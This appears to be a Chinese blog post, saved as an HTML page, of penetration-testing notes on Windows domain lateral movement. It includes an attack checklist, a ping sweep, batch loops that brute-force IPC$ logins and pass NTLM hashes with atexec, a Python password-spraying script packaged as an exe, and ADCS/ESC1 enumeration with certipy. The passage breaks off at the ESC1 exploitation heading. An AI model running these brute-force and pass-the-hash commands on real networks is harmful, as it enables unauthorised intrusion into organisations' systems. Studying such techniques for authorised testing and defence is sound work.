@@ -1,0 +1,1141 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Windows横向移动 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='攻防, 内网渗透' />
+  <meta itemprop="name" content="windows横向移动">
+  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="wordCount" content="2429">
+  <meta itemprop="keywords" content="攻防,内网渗透"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/52/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="windows横向移动">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:tag" content="攻防">
+    <meta property="article:tag" content="内网渗透">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="windows横向移动">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/52/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/59/" /><link rel="next" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/54/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "windows横向移动",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/windows\/52\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 内网渗透","wordcount":  2429 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/windows\/52\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Windows横向移动</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Windows横向移动</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="2429 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 2500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>12 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><p>内网渗透之横向移动基础总结（一）https://tttang.com/archive/1890/</p>
+<p>内网横移：抓取域管理员密码https://www.freebuf.com/articles/web/370338.html</p>
+<p>内网渗透测试：利用DCOM进行横向渗透https://www.freebuf.com/articles/network/261454.html</p>
+<h5 id="思路" class="heading-element"><span>0.0.0.1  思路</span>
+  <a href="#%e6%80%9d%e8%b7%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>如何信息搜集</p>
+<ol>
+<li>本机（权限、网络、系统、路由、端口、进程、会话、共享、服务、计划任务、自启动、补丁、在线用户）</li>
+<li>域（域控、用户、用户组、密码策略、信任关系  进行dcsync、pth、ptk攻击）</li>
+<li>探活主机+端口（存在漏洞的web、系统、数据库、shiro等通过ping、netbios、arp、route、smb等探测）</li>
+<li>凭据（哈希、软件凭据）</li>
+</ol>
+<p>如何攻击域控：https://www.lianqing.xyz/?p=668</p>
+<ol>
+<li>dcsync</li>
+<li>窃取域管理员令牌</li>
+<li>pth   提权到system后如果域控登陆过这个机器psexec、wmiexec、CS、MSF 等直接横向</li>
+<li>SYSVOL 组策略获取密码</li>
+<li>Kerberoasting 暴力破解密码</li>
+<li>通过域内的中继，强制NTLM认证，如打印机</li>
+<li>委派</li>
+<li>与域控相关的web</li>
+<li>域控漏洞</li>
+</ol>
+<h5 id="主机探测" class="heading-element"><span>0.0.0.2  主机探测</span>
+  <a href="#%e4%b8%bb%e6%9c%ba%e6%8e%a2%e6%b5%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>NEtBIos</p>
+<p>nbtscan是一个命令行工具，用于扫描本地或远程tcp/ip网络上的开放NEtBIos名称服务器。</p>
+<p>除了利用NEtBIos探测内网，还可以利用icmp协议探测内网。</p>
+<p>for /L %I in (1,1,254) Do @ping -w l -n 1 192.168.1.%I findstr &ldquo;TTL=&rdquo;</p>
+<p>1.arp-scan工具</p>
+<p>arp -a</p>
+<h5 id="文件传输" class="heading-element"><span>0.0.0.3  文件传输</span>
+  <a href="#%e6%96%87%e4%bb%b6%e4%bc%a0%e8%be%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>见 windows下的内网传输技术</p>
+<h5 id="批量利用脚本工具进行爆破连接" class="heading-element"><span>0.0.0.4  批量利用脚本、工具进行爆破连接</span>
+  <a href="#%e6%89%b9%e9%87%8f%e5%88%a9%e7%94%a8%e8%84%9a%e6%9c%ac%e5%b7%a5%e5%85%b7%e8%bf%9b%e8%a1%8c%e7%88%86%e7%a0%b4%e8%bf%9e%e6%8e%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>#####批量检测 IP 对应明文连接
+FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ &#34;admin!@#45&#34; /user:administrator
+
+#####批量检测 IP 对应明文 回显版
+FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami
+
+#####批量检测明文对应 IP 回显版
+FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.1.131 whoami
+
+##### 批量检测 HASH 对应 IP 回显版
+FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.1.131 whoami</code></pre><p>前期除了收集明文密码HASH等，还收集了用户名，用户名配合密码字典,用python打包成.exe可执行文件</p>
+<pre tabindex="0"><code>pip install pyinstaller
+pyinstaller -F fuck_neiwang_001.py
+import os,time
+ips = {
+
+}
+##### net user /domain
+users = {
+    &#39;Administrator&#39;,
+    &#39;7BOB&#39;,
+    &#39;uf9n1x&#39;
+    &#39;webserver-2008&#39;
+
+}
+passs = {
+
+}
+
+for ip in ips:
+    for user in users:
+        for mima in passs:
+            exec = &#34;net use \\&#34; + ip + &#39;\ipc$&#39; + mima + &#39; /user:god\\&#39; + user
+            print(&#39;---&gt;&#39; + exec + &#39;&lt;---&#39;)
+            os.system(exec)
+            time.sleep(1)</code></pre><h5 id="adcs" class="heading-element"><span>0.0.0.5  ADCS</span>
+  <a href="#adcs" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p><a href="https://www.4hou.com/posts/w2og"target="_blank" rel="external nofollow noopener noreferrer">https://www.4hou.com/posts/w2og</a></p>
+<p><a href="https://xz.aliyun.com/t/11627"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/11627</a></p>
+<p><a href="https://www.netstarsec.com/?s=adcs"target="_blank" rel="external nofollow noopener noreferrer">https://www.netstarsec.com/?s=adcs</a></p>
+<h6 id="背景" class="heading-element"><span>0.0.0.5.1  背景</span>
+  <a href="#%e8%83%8c%e6%99%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p><strong>1.什么是PKI？</strong></p>
+<p>公钥基础建设 (Public Key Infrastructure，简称PKI) 是一组由硬件、软件、参与者、管理者与流程组成的基础架构，其目的在于创造、管理、分配、使用、存储以及撤销数字证书。PKI依赖于经过身份验证的用户和受信任的资源之间的数字证书交换。可以使用证书来保护数据安全，并管理来自组织内外的用户和计算机的标识凭据。</p>
+<p><strong>2.什么是CA？</strong></p>
+<p>数字证书认证机构 (Certificate Authority，简称CA) 是负责签发证书、认证证书、管理已颁发证书的权威机构。它要==制定政策和具体步骤来验证、识别用户身份，并对用户证书进行签名，以确保证书持有者的身份和公钥的拥有权==。</p>
+<p><strong>3.什么是证书？</strong></p>
+<p>证书是一个小文件，此文件包含了==公钥信息==、==拥有者身份信息==、以及数字证书认证机构对这份文件的==数字签名==，以保证这个文件的整体内容正确无误。</p>
+<p>拥有者凭此文件，可向电脑系统或者其他用户表明身份，从而获得对方的信任并授权访问或使用某些敏感的电脑服务。==在证书注册过程中，客户端会生成公钥/私钥对，然后客户端将公钥发送到CA，而CA会确认客户端信息，用自己的私钥对其进行签名，随后再将包含客户端公钥的证书发送回客户端==。</p>
+<p>在概念上，证书相当于驾照，交警部门相当于CA。将身份信息与考核情况递交给交警部门，他们会给我们一个带有特有盖章的驾照，这样才可以开车上路。乘客会因为驾照而信任你的驾车技术，因为只有通过考核交警部门才会给你发驾照。如果严重违反了交通规则，你会被吊销驾照，不能开车载人。</p>
+<p><strong>4.什么是ADCS？</strong></p>
+<p>Active Directory证书服务(ADCS)用于颁发和管理PKI证书，ADCS提供的数字证书可用于对电子文档和消息进行加密和数字签名。此外，这些数字证书还可用于验证网络上的计算机、用户和设备账户。这些证书服务从windows 2000开始提供，并且在windows Server 2008R2中作为服务器角色提供。</p>
+<p><strong>5.什么是证书模板？</strong></p>
+<p>证书模板定义了用户和设备如何根据模板来请求和使用企业CA颁发的证书。例如你可以创建一个模板来提供文件加密或电子邮件签名功能。CA依赖于ADDS来存储配置的模板。注意，==只有在使用企业CA时才可以使用证书模板==，这意味着，在使用独立CA时，必须手动创建每个证书请求，并添加需要在证书中包含的必须信息。</p>
+<p>CA针对用户和计算机提供了模板，<strong>可以向证书模板分配相应的权限</strong>，以定义可以管理模板的人员、可以执行注册或自动注册的人员，以及默认的有效期和续订期。可以<strong>通过复制预定义的证书模板来应用其他修改</strong>。</p>
+<p><strong>6.如何申请证书？</strong></p>
+<p>（1）客户端创建公钥和私钥</p>
+<p>（2）客户端向企业 CA 服务器发送证书请求 (CSR)</p>
+<p>（3）CA会判断，证书模板是否存在？证书模板是否允许 CSR 中的设置？用户是否允许注册证书？</p>
+<p>（4）若符合上面条件CA 生成证书并使用 CA 私钥对其进行签名</p>
+<p>手动申请证书</p>
+<pre tabindex="0"><code>客户端首先生成一个证书申请文件，我们可以通过openssl生成。
+首先生成私钥
+openssl genrsa -out server.key 1024
+生成公钥
+openssl rsa -in server.key -pubout -out public.key
+
+根据私钥生成证书申请文件CSR
+openssl req -new -key server.key -out server.csr
+
+客户端把证书申请文件(CSR)发送给CA，然后选择一个证书模板。接着CA会判断证书模板是否存在，CSR请求的内容在模板中是否被允许使用，是否允许用户注册证书。注
+
+CA用自己的私钥来签署证书，然后将其返回给客户端。</code></pre><p>也可以通过web端申请证书</p>
+<p>如果在域内则可以启动certmgr.msc来申请用户证书，或者使用certlm.msc申请计算机证书。</p>
+<p><strong>7.PKINIT协议</strong></p>
+<p>PKINIT协议为kerberos 协议的一个扩展协议，可通过X.509证书来获取kerberos的TGT票据，PKINIT与kerberos差别主要在AS阶段，一种是基于对称密钥加密的认证方式，PKINIT是基于非对称密钥加密的认证方式，我们可以首先来看看正常kerberos的AS认证流程：</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406071713555.webp" alt="image-20240607171319356" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406071713555.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406071713555.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406071713555.webp?size=large 2x" data-title="image-20240607171319356" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>接着来看PKINIT的认证流程：</strong></p>
+<p>（1）client使用向==CA申请的证书==与client自己的==私钥加密的时间戳==发送给KDC。</p>
+<p>（2）KDC 通过CA证书链验证client的身份，并获取到==client证书里面的公钥==，然后用==公钥解密时间戳==，并判断时间戳是否符合规定时间。</p>
+<p>（3）若上述身份验证通过，并且时间戳符合规则则==返回TGT与一个会话密钥==（其中会话密钥使用下面两种算法生成）。</p>
+<p>PKINIT 是不太常见的非对称密钥方法。客户端有一个公/私密钥对，并用他们的私钥对预验证数据进行加密，KDC 用客户端的公钥对其进行解密。</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406071713043.webp" alt="image-20240607171353877" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406071713043.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406071713043.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406071713043.webp?size=large 2x" data-title="image-20240607171353877" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h6 id="信息枚举" class="heading-element"><span>0.0.0.5.2  信息枚举</span>
+  <a href="#%e4%bf%a1%e6%81%af%e6%9e%9a%e4%b8%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 域内</p>
+<p>是否存在域和ADCS，并且获取CA和对应IP.</p>
+<pre tabindex="0"><code>net config workstation
+nslookup -type=srv _ldap._tcp.dc._msdcs.FQDN
+certutil -CA
+nslookup DNSName</code></pre><p>####### 域外</p>
+<p>判断是否存在域，通常域控的NetBIOS名称有关键字例如DC字样，fscan也能直接识别，域控也会通常开启<code>53</code>&amp;<code>88</code>&amp;<code>389</code>&amp;<code>636</code>端口。</p>
+<p>通过各种方法我们已经获得了一个域账号，查看是否有ADCS服务：</p>
+<pre tabindex="0"><code>certipy find -u zhangsan@red.lab -p zs@123456 -dc-ip 192.168.149.133 -dc-only -stdout</code></pre><p>当然ADCS存在页面http[:]//IP/certsrv/Default.asp，fscan能直接识别</p>
+<h6 id="esc1" class="heading-element"><span>0.0.0.5.3  ESC1</span>
+  <a href="#esc1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 漏洞配置</p>
+<p>ESC1利用前提条件：</p>
+<ul>
+<li><strong>msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT</strong>
+表示基于此证书模板申请新证书的用户可以为其他用户申请证书，即任何用户，包括域管理员用户</li>
+<li><strong>PkiExtendedKeyUsage: Client Authentication</strong>
+表示将基于此证书模板生成的证书可用于对 Active Directory 中的计算机进行身份验证</li>
+<li><strong>Enrollment Rights: NT Authority\Authenticated Users</strong>
+表示允许 Active Directory 中任何经过身份验证的用户请求基于此证书模板生成的新证书</li>
+</ul>
+<p>####### 漏洞利用</p>
+<p>######## 域内</p>
